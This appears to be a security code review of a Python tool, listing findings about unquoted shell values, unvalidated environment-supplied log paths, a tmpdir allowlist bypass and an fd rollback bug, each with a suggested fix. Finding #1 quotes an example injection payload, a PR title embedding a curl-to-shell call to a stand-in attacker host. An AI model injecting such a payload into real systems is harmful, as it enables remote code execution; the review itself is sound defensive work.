### In-Scope Findings

1. **security** `python/finalize.py:356` — `write_finalize_state_merged` writes every value as the bare string `{key}={value}\n` with no shell quoting. User-controlled strings filled via `_persist_stall_metadata_if_needed` — specifically `PR_TITLE` (an arbitrary PR title set by the contributor), `PR_URL`, and values read from `ctx.state_file` via `_state_file_kv` — may contain shell metacharacters (`$(…)`, backticks, spaces). When `restore-finalize-state.sh` or similar bash scripts later `source` `finalize-state.sh`, those metacharacters are evaluated, enabling code injection. A PR with title `"Add widget $(curl attacker.example/x | sh)"` would produce `PR_TITLE=Add widget $(curl attacker.example/x | sh)` in the file, executing on the next `source`. **Suggested fix:** Single-quote all values on write: `f"{key}='{value.replace(\"'\", \"'\\\\''\")}'\n"`. Ensure `read_finalize_state` handles single-quoted values (it does via `shlex.split`).

- **security** `python/logging_util.py:62-66` — `quiet_init()` uses `LARCH_QUIET_LOG_FILE` from the environment verbatim with no path validation. The very next line does `path.parent.mkdir(parents=True, exist_ok=True)`, and then redirects fd 1 and fd 2 to `path` via `os.dup2`. An attacker who can set `LARCH_QUIET_LOG_FILE=<OPERATOR_REPO_PATH>/authorized_keys` (or any writable path) causes the process to create parent directories and append process stdout/stderr there. This bypasses the `_tmpdir_under_allowed_root` gate in `ship.py:main()` entirely since `LARCH_QUIET_LOG_FILE` is consulted *inside* `quiet_init`, not by the gate. **Suggested fix:** Inside `quiet_init`, when `LARCH_QUIET_LOG_FILE` is preset, validate it resolves to a path under one of the same allowlisted roots that `_tmpdir_under_allowed_root` checks.

2. **security** `python/ship.py:879` — `os.environ.setdefault(config.ENV_IMPLEMENT_TMPDIR, ctx.tmpdir)` is a no-op when `IMPLEMENT_TMPDIR` is already set in the inherited environment. The `_tmpdir_under_allowed_root(ctx.tmpdir)` gate validates `ctx.tmpdir` (from `--tmpdir` / `IMPLEMENT_TMPDIR` / `TMPDIR` fallback chain), but the subsequent `quiet_init()` uses `IMPLEMENT_TMPDIR` from the environment — which may be a stale, attacker-pre-set value pointing outside the allowlist. For example: parent sets `IMPLEMENT_TMPDIR=/home/user/exfil` (an existing directory not under `/tmp` or `~/.cache/larch`), child is invoked with `--tmpdir /tmp/claude-session-xyz` (which passes the gate), `setdefault` leaves `IMPLEMENT_TMPDIR=<OPERATOR_REPO_PATH>, and `quiet_init` creates `larch-quiet-ship.py-<pid>.log` there, redirecting fd 1/2. **Suggested fix:** Replace `setdefault` with an unconditional assignment `os.environ[config.ENV_IMPLEMENT_TMPDIR] = ctx.tmpdir` after the gate passes, so `quiet_init` always sees the validated value.

3. **correctness** `python/logging_util.py:72-82` — The partial-failure path in `quiet_init` is not fully rolled back. If `os.dup2(log_fd, 1)` succeeds but `os.dup2(log_fd, 2)` raises (an exceptional but possible race), the `OSError` handler sets `_self_initialized_quiet = False` but fd 1 is now the log file while fd 3 is the original stdout. `contract_stream()` correctly checks `_self_initialized_quiet` and returns `sys.stdout`, but `sys.stdout` wraps fd 1 which is now the log file. The subsequent `emit_result` call would write contract JSON to the log file rather than the original stdout, silently hiding the JSON from the caller. **Suggested fix:** On OSError inside the dup2 block, attempt to restore fd 1 from fd 3 (`os.dup2(3, 1)`) before calling `_clear_quiet_env`. A `try/except` around the restoration is sufficient since this is already in an error path.

Fields including `TITLE`, `PR_URL`, and `BRANCH_NAME` are written without quoting. The vulnerability in Finding #1 above is an extension of this pre-existing pattern.
